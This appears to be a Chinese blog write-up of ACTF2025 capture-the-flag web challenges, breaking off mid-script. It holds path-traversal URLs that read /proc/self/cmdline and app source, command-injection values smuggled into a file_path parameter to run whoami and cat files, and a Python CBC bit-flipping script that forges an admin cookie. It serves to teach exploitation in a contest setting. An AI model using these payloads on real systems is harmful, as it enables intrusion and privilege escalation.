@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - ACTF2025 web部分题解</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>ACTF2025 web部分题解</h1>
+    <p>
+        <span class="meta">发布于: 2025-04-27 22:31</span>
+    </p>
+    <div class="post-body">
+        <p><img src="/images/actf2025/0.png" alt="0"></p>
+<h2>upload</h2>
+<p>尝试admin、123456登录，失败，尝试admin'，123456登录成功，奇怪</p>
+<p>上传文件后，url是<code>http://223.112.5.141:61869/upload?file_path=图片路径</code></p>
+<p>惊喜，尝试发现存在文件读取、路径穿越漏洞，读取结果会以图片base64的形式返回</p>
+<p>读取命令行运行命令，找到了源码文件名</p>
+<pre><code class="language-plaintext"># 读取命令行运行命令
+http://223.112.5.141:61869/upload?file_path=../../../../proc/self/cmdline</code></pre>
+<p>读取源码</p>
+<pre><code class="language-plaintext"># 读取源码
+http://223.112.5.141:61869/upload?file_path=../../../../app/app.py</code></pre>
+<p><img src="/images/actf2025/1.png" alt="1"></p>
+<p>源码</p>
+<pre><code class="language-python">import uuid
+import os
+import hashlib
+import base64
+from flask import Flask, request, redirect, url_for, flash, session
+
+app = Flask(__name__)
+app.secret_key = os.getenv('SECRET_KEY')
+
+@app.route('/')
+def index():
+    if session.get('username'):
+        return redirect(url_for('upload'))
+    else:
+        return redirect(url_for('login'))
+
+@app.route('/login', methods=['POST', 'GET'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        if username == 'admin':
+            if hashlib.sha256(password.encode()).hexdigest() == '32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0':
+                session['username'] = username
+                return redirect(url_for('index'))
+            else:
+                flash('Invalid password')
+        else:
+            session['username'] = username
+            return redirect(url_for('index'))
+    else:
+        return '''
+        &lt;h1&gt;Login&lt;/h1&gt;
+        &lt;h2&gt;No need to register.&lt;/h2&gt;
+        &lt;form action="/login" method="post"&gt;
+            &lt;label for="username"&gt;Username:&lt;/label&gt;
+            &lt;input type="text" id="username" name="username" required&gt;
+            &lt;br&gt;
+            &lt;label for="password"&gt;Password:&lt;/label&gt;
+            &lt;input type="password" id="password" name="password" required&gt;
+            &lt;br&gt;
+            &lt;input type="submit" value="Login"&gt;
+        &lt;/form&gt;
+        '''
+
+@app.route('/upload', methods=['POST', 'GET'])
+def upload():
+    if not session.get('username'):
+        return redirect(url_for('login'))
+
+    if request.method == 'POST':
+        f = request.files['file']
+        file_path = str(uuid.uuid4()) + '_' + f.filename
+        f.save('./uploads/' + file_path)
+        return redirect(f'/upload?file_path={file_path}')
+
+    else:
+        if not request.args.get('file_path'):
+            return '''
+            &lt;h1&gt;Upload Image&lt;/h1&gt;
+
+            &lt;form action="/upload" method="post" enctype="multipart/form-data"&gt;
+                &lt;input type="file" name="file"&gt;
+                &lt;input type="submit" value="Upload"&gt;
+            &lt;/form&gt;
+            '''
+
+        else:
+            file_path = './uploads/' + request.args.get('file_path')
+            if session.get('username') != 'admin':
+                with open(file_path, 'rb') as f:
+                    content = f.read()
+                    b64 = base64.b64encode(content)
+                    return f'&lt;img src="data:image/png;base64,{b64.decode()}" alt="Uploaded Image"&gt;'
+            else:
+                os.system(f'base64 {file_path} &gt; /tmp/{file_path}.b64')
+                # with open(f'/tmp/{file_path}.b64', 'r') as f:
+                #     return f'&lt;img src="data:image/png;base64,{f.read()}" alt="Uploaded Image"&gt;'
+                return 'Sorry, but you are not allowed to view this image.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)</code></pre>
+<p>分析源码，关键部分</p>
+<p><strong>admin登录</strong></p>
+<pre><code class="language-python">if username == 'admin':
+            if hashlib.sha256(password.encode()).hexdigest() == '32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0':
+                session['username'] = username</code></pre>
+<p>密码的sha256值是<code>32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0</code>，彩虹表查询一下，密码是<code>backdoor</code></p>
+<p><img src="/images/actf2025/2.png" alt="2"></p>
+<p><strong>上传策略</strong></p>
+<pre><code class="language-python"> else:
+            file_path = './uploads/' + request.args.get('file_path')
+            if session.get('username') != 'admin':
+                with open(file_path, 'rb') as f:
+                    content = f.read()
+                    b64 = base64.b64encode(content)
+                    return f'&lt;img src="data:image/png;base64,{b64.decode()}" alt="Uploaded Image"&gt;'
+            else:
+                os.system(f'base64 {file_path} &gt; /tmp/{file_path}.b64')
+                # with open(f'/tmp/{file_path}.b64', 'r') as f:
+                #     return f'&lt;img src="data:image/png;base64,{f.read()}" alt="Uploaded Image"&gt;'
+                return 'Sorry, but you are not allowed to view this image.'</code></pre>
+<p>这里普通用户上传后会返回base64编码的图片，admin用户上传后会执行<code>os.system(f'base64 {file_path} &gt; /tmp/{file_path}.b64')</code>，直接把file_path拼接进去，没有过滤，看起来存在命令注入漏洞</p>
+<p>构造命令</p>
+<pre><code class="language-bash">111;whoami;#</code></pre>
+<p>迷糊了，这个admin是不管执行什么命令都返回<code>Sorry, but you are not allowed to view this image.</code>，验证存在漏洞可以尝试dnslog外带，发现好像不出网</p>
+<p>那就用admin用户命令注入，把执行结果写入到<code>/tmp</code>目录下，使用普通用户读取，完美</p>
+<pre><code class="language-bash">111;whoami &gt; /tmp/1.txt;#</code></pre>
+<p>成功执行命令</p>
+<p><img src="/images/actf2025/3.png" alt="3"></p>
+<p>查看flag，flag在根目录下的<code>Fl4g_is_H3r3</code>文件中</p>
+<pre><code class="language-bash">1111;ls / &gt; /tmp/1.txt;cat /* &gt;&gt; /tmp/1.txt;%23</code></pre>
+<p><img src="/images/actf2025/4.png" alt="4"></p>
+<h2>not so web 1</h2>
+<p>注册用户<code>1/1</code>，登录后，返回了一大坨编码</p>
+<p>抱着试一试的心态尝试b64解码，竟然真是b64..</p>
+<p>源码</p>
+<pre><code class="language-python">import base64, json, time
+import os, sys, binascii
+from dataclasses import dataclass, asdict
+from typing import Dict, Tuple
+from secret import KEY, ADMIN_PASSWORD
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from flask import (
+    Flask,
+    render_template,
+    render_template_string,
+    request,
+    redirect,
+    url_for,
+    flash,
+    session,
+)
+
+app = Flask(__name__)
+app.secret_key = KEY
+
+
+@dataclass(kw_only=True)
+class APPUser:
+    name: str
+    password_raw: str
+    register_time: int
+
+
+#  In-memory store for user registration
+users: Dict[str, APPUser] = {
+    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
+}
+
+
+def validate_cookie(cookie: str) -&gt; bool:
+    if not cookie:
+        return False
+
+    try:
+        cookie_encrypted = base64.b64decode(cookie, validate=True)
+    except binascii.Error:
+        return False
+
+    if len(cookie_encrypted) &lt; 32:
+        return False
+
+    try:
+        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        cookie_json = cipher.decrypt(padded)
+    except ValueError:
+        return False
+
+    try:
+        _ = json.loads(cookie_json)
+    except Exception:
+        return False
+
+    return True
+
+
+def parse_cookie(cookie: str) -&gt; Tuple[bool, str]:
+    if not cookie:
+        return False, ""
+
+    try:
+        cookie_encrypted = base64.b64decode(cookie, validate=True)
+    except binascii.Error:
+        return False, ""
+
+    if len(cookie_encrypted) &lt; 32:
+        return False, ""
+
+    try:
+        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        decrypted = cipher.decrypt(padded)
+        cookie_json_bytes = unpad(decrypted, 16)
+        cookie_json = cookie_json_bytes.decode()
+    except ValueError:
+        return False, ""
+
+    try:
+        cookie_dict = json.loads(cookie_json)
+    except Exception:
+        return False, ""
+
+    return True, cookie_dict.get("name")
+
+
+def generate_cookie(user: APPUser) -&gt; str:
+    cookie_dict = asdict(user)
+    cookie_json = json.dumps(cookie_dict)
+    cookie_json_bytes = cookie_json.encode()
+    iv = os.urandom(16)
+    padded = pad(cookie_json_bytes, 16)
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    encrypted = cipher.encrypt(padded)
+    return base64.b64encode(iv + encrypted).decode()
+
+
+@app.route("/")
+def index():
+    if validate_cookie(request.cookies.get("jwbcookie")):
+        return redirect(url_for("home"))
+    return redirect(url_for("login"))
+
+
+@app.route("/register", methods=["GET", "POST"])
+def register():
+    if request.method == "POST":
+        user_name = request.form["username"]
+        password = request.form["password"]
+        if user_name in users:
+            flash("Username already exists!", "danger")
+        else:
+            users[user_name] = APPUser(
+                name=user_name, password_raw=password, register_time=int(time.time())
+            )
+            flash("Registration successful! Please login.", "success")
+            return redirect(url_for("login"))
+    return render_template("register.html")
+
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        username = request.form["username"]
+        password = request.form["password"]
+        if username in users and users[username].password_raw == password:
+            resp = redirect(url_for("home"))
+            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
+            return resp
+        else:
+            flash("Invalid credentials. Please try again.", "danger")
+    return render_template("login.html")
+
+
+@app.route("/home")
+def home():
+    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
+    if not valid or not current_username:
+        return redirect(url_for("logout"))
+
+    user_profile = users.get(current_username)
+    if not user_profile:
+        return redirect(url_for("logout"))
+
+    if current_username == "admin":
+        payload = request.args.get("payload")
+        html_template = """
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"&gt;
+    &lt;link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h2 class="text-center"&gt;Welcome, %s !&lt;/h2&gt;
+        &lt;div class="text-center"&gt;
+            Your payload: %s
+        &lt;/div&gt;
+        &lt;img src="{{ url_for('static', filename='interesting.jpeg') }}" alt="Embedded Image"&gt;
+        &lt;div class="text-center"&gt;
+            &lt;a href="/logout" class="btn btn-danger"&gt;Logout&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+""" % (
+            current_username,
+            payload,
+        )
+    else:
+        html_template = (
+            """
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"&gt;
+    &lt;link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;h2 class="text-center"&gt;server code (encoded)&lt;/h2&gt;
+        &lt;div class="text-center" style="word-break:break-all;"&gt;
+        {%% raw %%}
+            %s
+        {%% endraw %%}
+        &lt;/div&gt;
+        &lt;div class="text-center"&gt;
+            &lt;a href="/logout" class="btn btn-danger"&gt;Logout&lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+"""
+            % base64.b64encode(open(__file__, "rb").read()).decode()
+        )
+    return render_template_string(html_template)
+
+
+@app.route("/logout")
+def logout():
+    resp = redirect(url_for("login"))
+    resp.delete_cookie("jwbcookie")
+    return resp
+
+
+if __name__ == "__main__":
+    app.run()</code></pre>
+<p>只会一点web，通过ai长时间交流，知道这里是<code>CBC bit flipping Attack</code>翻转攻击</p>
+<p>题目不存在文件读取等漏洞，KEY不可知，注册过程没有使用KEY，不能通过flask-unsign爆破KEY，所以只能通过<code>CBC bit flipping Attack</code>来伪造身份</p>
+<p>源码关键点：</p>
+<pre><code class="language-python">def generate_cookie(user: APPUser) -&gt; str:
+    cookie_dict = asdict(user)
+    cookie_json = json.dumps(cookie_dict)
+    cookie_json_bytes = cookie_json.encode()
+    iv = os.urandom(16)
+    padded = pad(cookie_json_bytes, 16)
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    encrypted = cipher.encrypt(padded)
+    return base64.b64encode(iv + encrypted).decode()</code></pre>
+<p>生成cookie的函数，使用AES加密，16位的iv，16位的key，16位的padding，最后返回base64编码的iv+encrypted</p>
+<p>太难辣！！</p>
+<p>拿到本地，自定义key，测试一下cbc伪造身份是否可行</p>
+<p>注册一个用户<code>bdmin</code>，密码1，登录，拿到cookie，使用CBC位翻转攻击，伪造一个<code>admin</code>的cookie</p>
+<p>app.py</p>
+<pre><code class="language-python">import base64, json, time
+import os, sys, binascii
+from dataclasses import dataclass, asdict
+from typing import Dict, Tuple
+from secret import KEY, ADMIN_PASSWORD
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
+from flask import (
+    Flask,
+    render_template,
+    render_template_string,
+    request,
+    redirect,
+    url_for,
+    flash,
+    session,
+)
+
+app = Flask(__name__)
+app.secret_key = KEY
+
+
+@dataclass(kw_only=True)
+class APPUser:
+    name: str
+    password_raw: str
+    register_time: int
+
+
+#  In-memory store for user registration
+users: Dict[str, APPUser] = {
+    "admin": APPUser(name="admin", password_raw=ADMIN_PASSWORD, register_time=-1)
+}
+
+
+def validate_cookie(cookie: str) -&gt; bool:
+    if not cookie:
+        return False
+
+    try:
+        cookie_encrypted = base64.b64decode(cookie, validate=True)
+    except binascii.Error:
+        return False
+
+    if len(cookie_encrypted) &lt; 32:
+        return False
+
+    try:
+        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        cookie_json = cipher.decrypt(padded)
+    except ValueError:
+        return False
+
+    try:
+        _ = json.loads(cookie_json)
+    except Exception:
+        return False
+
+    return True
+
+
+def debug_cookie(cookie: str):
+    try:
+        # 移除特殊字符并补全Base64长度
+        cookie = cookie.replace('/', '').replace('_', '').replace('-', '')
+        # 计算需要补充的'='数量
+        pad_len = 4 - (len(cookie) % 4)
+        cookie += '=' * pad_len if pad_len != 4 else ''
+
+        decoded = base64.b64decode(cookie)
+        iv = decoded[:16]
+        ciphertext = decoded[16:]
+
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        decrypted = unpad(cipher.decrypt(ciphertext), 16)
+        print(f"[解密成功]\nIV: {iv.hex()}\n明文: {decrypted.decode()}")
+        return True
+    except Exception as e:
+        print(f"[解密失败] 错误类型: {type(e).__name__}\n详细信息: {str(e)}")
+        return False
+def parse_cookie(cookie: str) -&gt; Tuple[bool, str]:
+    debug_cookie(request.cookies.get("jwbcookie"))
+    if not cookie:
+        return False, ""
+
+    try:
+        cookie_encrypted = base64.b64decode(cookie, validate=True)
+    except binascii.Error:
+        return False, ""
+
+    if len(cookie_encrypted) &lt; 32:
+        return False, ""
+
+    try:
+        iv, padded = cookie_encrypted[:16], cookie_encrypted[16:]
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        decrypted = cipher.decrypt(padded)
+        cookie_json_bytes = unpad(decrypted, 16)
+        cookie_json = cookie_json_bytes.decode()
+    except ValueError:
+        return False, ""
+
+    try:
+        cookie_dict = json.loads(cookie_json)
+    except Exception:
+        return False, ""
+
+    return True, cookie_dict.get("name")
+
+
+def generate_cookie(user: APPUser) -&gt; str:
+    cookie_dict = asdict(user)
+    cookie_json = json.dumps(cookie_dict)
+    cookie_json_bytes = cookie_json.encode()
+    iv = os.urandom(16)
+    padded = pad(cookie_json_bytes, 16)
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    encrypted = cipher.encrypt(padded)
+    return base64.b64encode(iv + encrypted).decode()
+
+
+@app.route("/")
+def index():
+    if validate_cookie(request.cookies.get("jwbcookie")):
+        return redirect(url_for("home"))
+    return redirect(url_for("login"))
+
+
+@app.route("/register", methods=["GET", "POST"])
+def register():
+    if request.method == "POST":
+        user_name = request.form["username"]
+        password = request.form["password"]
+        if user_name in users:
+            flash("Username already exists!", "danger")
+        else:
+            users[user_name] = APPUser(
+                name=user_name, password_raw=password, register_time=int(time.time())
+            )
+            flash("Registration successful! Please login.", "success")
+            return redirect(url_for("login"))
+    return render_template("register.html")
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        username = request.form["username"]
+        password = request.form["password"]
+        if username in users and users[username].password_raw == password:
+            resp = redirect(url_for("home"))
+            resp.set_cookie("jwbcookie", generate_cookie(users[username]))
+            return resp
+        else:
+            flash("Invalid credentials. Please try again.", "danger")
+    return render_template("login.html")
+
+@app.route("/home")
+def home():
+    valid, current_username = parse_cookie(request.cookies.get("jwbcookie"))
+    if not valid or not current_username:
+        return redirect(url_for("logout"))
+
+    user_profile = users.get(current_username)
+    if not user_profile:
+        return redirect(url_for("logout"))
+
+    if current_username == "admin":
+        payload = request.args.get("payload", "")
+        return render_template("home.html",
+                           current_username=current_username,
+                           payload=payload)
+    else:
+        server_code = base64.b64encode(open(__file__, "rb").read()).decode()
+        return render_template("home.html",
+                           current_username=current_username,
+                           server_code=server_code)
+
+@app.route("/logout")
+def logout():
+    resp = redirect(url_for("login"))
+    resp.delete_cookie("jwbcookie")
+    return resp
+
+
+if __name__ == "__main__":
+    app.run()</code></pre>
+<p>secret.py</p>
+<pre><code class="language-python"># 修改后的 secret.py（本地测试用）
+KEY = b"0123456789123456"  # 已知的测试密钥
+ADMIN_PASSWORD = "admin_pass_123"  # 已知管理员密码</code></pre>
+<p>templates/home.html</p>
+<pre><code class="language-html">{% extends "base.html" %}
+
+{% block title %}Home{% endblock %}
+
+{% block content %}
+&lt;div class="row justify-content-center"&gt;
+    &lt;div class="col-md-8"&gt;
+        &lt;div class="card"&gt;
+            &lt;div class="card-header"&gt;
+                &lt;h4 class="mb-0"&gt;Welcome, {{ current_username }}!&lt;/h4&gt;
+            &lt;/div&gt;
+            &lt;div class="card-body"&gt;
+                {% if current_username == "admin" %}
+                    &lt;div class="mb-4"&gt;
+                        &lt;h5&gt;Admin Panel&lt;/h5&gt;
+                        &lt;div class="alert alert-info"&gt;
+                            Your payload: {{ payload }}
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                    &lt;img src="{{ url_for('static', filename='interesting.jpeg') }}" class="img-fluid rounded mb-4" alt="Admin Image"&gt;
+                {% else %}
+                    &lt;div class="mb-4"&gt;
+                        &lt;h5&gt;Server Information&lt;/h5&gt;
+                        &lt;div class="alert alert-secondary"&gt;
+                            &lt;pre style="white-space: pre-wrap; word-break: break-all;"&gt;{{ server_code }}&lt;/pre&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                {% endif %}
+                &lt;a href="/logout" class="btn btn-danger"&gt;Logout&lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+{% endblock %}</code></pre>
+<p>templates/base.html</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;{% block title %}Secure App{% endblock %}&lt;/title&gt;
+    &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
+    &lt;link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark"&gt;
+        &lt;div class="container"&gt;
+            &lt;a class="navbar-brand" href="/"&gt;Secure App&lt;/a&gt;
+            &lt;div class="navbar-nav"&gt;
+                {% if session.get('logged_in') %}
+                    &lt;a class="nav-link" href="/logout"&gt;Logout&lt;/a&gt;
+                {% else %}
+                    &lt;a class="nav-link" href="/login"&gt;Login&lt;/a&gt;
+                    &lt;a class="nav-link" href="/register"&gt;Register&lt;/a&gt;
+                {% endif %}
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+
+    &lt;div class="container mt-4"&gt;
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                {% for category, message in messages %}
+                    &lt;div class="alert alert-{{ category }} alert-dismissible fade show"&gt;
+                        {{ message }}
+                        &lt;button type="button" class="btn-close" data-bs-dismiss="alert"&gt;&lt;/button&gt;
+                    &lt;/div&gt;
+                {% endfor %}
+            {% endif %}
+        {% endwith %}
+
+        {% block content %}{% endblock %}
+    &lt;/div&gt;
+
+    &lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>templates/register.html</p>
+<pre><code class="language-html">{% extends "base.html" %}
+
+{% block title %}Register{% endblock %}
+
+{% block content %}
+&lt;div class="row justify-content-center"&gt;
+    &lt;div class="col-md-6"&gt;
+        &lt;div class="card"&gt;
+            &lt;div class="card-header"&gt;
+                &lt;h4 class="mb-0"&gt;Register&lt;/h4&gt;
+            &lt;/div&gt;
+            &lt;div class="card-body"&gt;
+                &lt;form method="POST" action="/register"&gt;
+                    &lt;div class="mb-3"&gt;
+                        &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;
+                        &lt;input type="text" class="form-control" id="username" name="username" required&gt;
+                    &lt;/div&gt;
+                    &lt;div class="mb-3"&gt;
+                        &lt;label for="password" class="form-label"&gt;Password&lt;/label&gt;
+                        &lt;input type="password" class="form-control" id="password" name="password" required&gt;
+                    &lt;/div&gt;
+                    &lt;button type="submit" class="btn btn-primary"&gt;Register&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+            &lt;div class="card-footer text-center"&gt;
+                Already have an account? &lt;a href="/login"&gt;Login here&lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+{% endblock %}</code></pre>
+<p>templates/login.html</p>
+<pre><code class="language-html">{% extends "base.html" %}
+
+{% block title %}Login{% endblock %}
+
+{% block content %}
+&lt;div class="row justify-content-center"&gt;
+    &lt;div class="col-md-6"&gt;
+        &lt;div class="card"&gt;
+            &lt;div class="card-header"&gt;
+                &lt;h4 class="mb-0"&gt;Login&lt;/h4&gt;
+            &lt;/div&gt;
+            &lt;div class="card-body"&gt;
+                &lt;form method="POST" action="/login"&gt;
+                    &lt;div class="mb-3"&gt;
+                        &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;
+                        &lt;input type="text" class="form-control" id="username" name="username" required&gt;
+                    &lt;/div&gt;
+                    &lt;div class="mb-3"&gt;
+                        &lt;label for="password" class="form-label"&gt;Password&lt;/label&gt;
+                        &lt;input type="password" class="form-control" id="password" name="password" required&gt;
+                    &lt;/div&gt;
+                    &lt;button type="submit" class="btn btn-primary"&gt;Login&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;
+            &lt;div class="card-footer text-center"&gt;
+                Don't have an account? &lt;a href="/register"&gt;Register here&lt;/a&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+{% endblock %}</code></pre>
+<p>static/styles.css</p>
+<pre><code class="language-css">body {
+    background-color: #f8f9fa;
+}
+
+.card {
+    border-radius: 10px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+}
+
+.card-header {
+    background-color: #343a40;
+    color: white;
+    border-radius: 10px 10px 0 0 !important;
+}
+
+.form-control:focus {
+    border-color: #6c757d;
+    box-shadow: 0 0 0 0.25rem rgba(108, 117, 125, 0.25);
+}
+
+.btn-primary {
+    background-color: #343a40;
+    border-color: #343a40;
+}
+
+.btn-primary:hover {
+    background-color: #23272b;
+    border-color: #23272b;
+}</code></pre>
+<p>翻转攻击脚本</p>
+<pre><code class="language-python">import base64
+from secret import KEY
+from urllib.parse import unquote
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
+import re
+import json
+
+
+def debug_cookie_advanced(cookie: str):
+    try:
+        cookie = unquote(cookie)
+        print(f"URL解码后: {cookie}")
+
+        cookie = re.sub(r"[^a-zA-Z0-9+/=]", "", cookie)
+        print(f"过滤后: {cookie}")
+
+        pad_len = (4 - len(cookie) % 4) % 4
+        cookie += "=" * pad_len
+        print(f"补全后: {cookie} (长度: {len(cookie)})")
+
+        decoded = base64.b64decode(cookie)
+        print(f"解码字节长度: {len(decoded)}")
+
+        iv = decoded[:16]
+        ciphertext = decoded[16:]
+        print(f"IV: {iv.hex()}")
+        print(f"密文长度: {len(ciphertext)}")
+
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        decrypted = unpad(cipher.decrypt(ciphertext), 16)
+        print(f"解密成功:\n{decrypted.decode()}")
+        return decrypted.decode()
+
+    except Exception as e:
+        print(f"[严重错误] {type(e).__name__}: {str(e)}")
+        return None
+
+
+def cbc_bitflip_attack_for_bdmin(original_cookie: str):
+    """
+    CBC位翻转，将bdmin改成admin
+    """
+    try:
+        # 1. 解码原始Cookie
+        cookie = unquote(original_cookie)
+        cookie = re.sub(r"[^a-zA-Z0-9+/=]", "", cookie)
+        pad_len = (4 - len(cookie) % 4) % 4
+        cookie += "=" * pad_len
+        decoded = base64.b64decode(cookie)
+        iv = bytearray(decoded[:16])
+        ciphertext = decoded[16:]
+
+        # 2. 解密获取原始明文
+        cipher = AES.new(KEY, AES.MODE_CBC, bytes(iv))
+        decrypted = unpad(cipher.decrypt(ciphertext), 16)
+        plaintext = decrypted.decode()
+        print(f"原始明文: {plaintext}")
+
+        # 3. 找到 "bdmin" 出现的位置
+        target_old = "bdmin"
+        target_new = "admin"
+
+        pos = plaintext.find(target_old)
+        if pos == -1:
+            raise ValueError("明文中未找到 bdmin")
+
+        print(f"找到bdmin的位置: {pos}")
+
+        # 4. 修改对应的IV或前一块密文
+        new_iv = bytearray(iv)
+        for i in range(len(target_old)):
+            old_byte = ord(target_old[i])
+            new_byte = ord(target_new[i])
+            flip = old_byte ^ new_byte
+            print(f"修改位置 {pos+i}: '{target_old[i]}' -&gt; '{target_new[i]}', 需要异或 {flip:02x}")
+
+            # 判断是修改IV还是前一个密文块
+            if pos + i &lt; 16:
+                # 在第一个block，修改IV
+                new_iv[pos + i] ^= flip
+            else:
+                # 超过第一个block的情况，可以扩展处理
+                raise ValueError("用户名位置超出IV修改范围，这里只处理第一个block内的情况")
+
+        # 5. 重新组合cookie
+        forged_cookie = base64.b64encode(new_iv + ciphertext).decode()
+        print(f"伪造后的Cookie: {forged_cookie}")
+
+        # 6. 验证结果
+        test_decrypted = debug_cookie_advanced(forged_cookie)
+        if test_decrypted and target_new in test_decrypted:
+            print("[+] CBC位翻转成功！")
+            return forged_cookie
+        else:
+            print("[-] 伪造失败，检查逻辑")
+            return None
+
+    except Exception as e:
+        print(f"[!] 攻击过程中发生错误: {str(e)}")
+        return None
+
+
+# 测试
+test_cookie = "XG4URR04ObV+DopSXbEzgKvIDEplNJwSnlgyeLueWA2/RomaRzPAp9UN1k6un//Leuo934UrvNPxRcFJrLIAwAexCIzJ0CdlYDz1JbTf5ZSiScTo5TjEkL15ZmXYiy15"
+
+print("=== 原始Cookie分析 ===")
+debug_cookie_advanced(test_cookie)
+
+print("\n=== 开始CBC位翻转攻击 ===")
+forged_cookie = cbc_bitflip_attack_for_bdmin(test_cookie)
+
+if forged_cookie:
+    print("\n=== 攻击成功 ===")
+    print(f"伪造的管理员Cookie: {forged_cookie}")
+else:
+    print("\n=== 攻击失败 ===")</code></pre>
+<p>尝试本地翻转攻击，看起来确实可行</p>
+<p><img src="/images/actf2025/5.png" alt="5"></p>
+<p>让AI生成一份，不需要使用KEY验证的脚本，只需要使用CBC位翻转攻击即可</p>
+<pre><code class="language-python">import base64
+import re
+from urllib.parse import unquote
+
+
+def cbc_bitflip_attack_without_key(original_cookie: str, target_old: str = "bdmin", target_new: str = "admin"):
+    """
+    无需KEY的CBC位翻转攻击
+    原理：通过修改前一个密文块来影响下一个块的解密结果
+    """
+    try:
+        # 1. 预处理Cookie
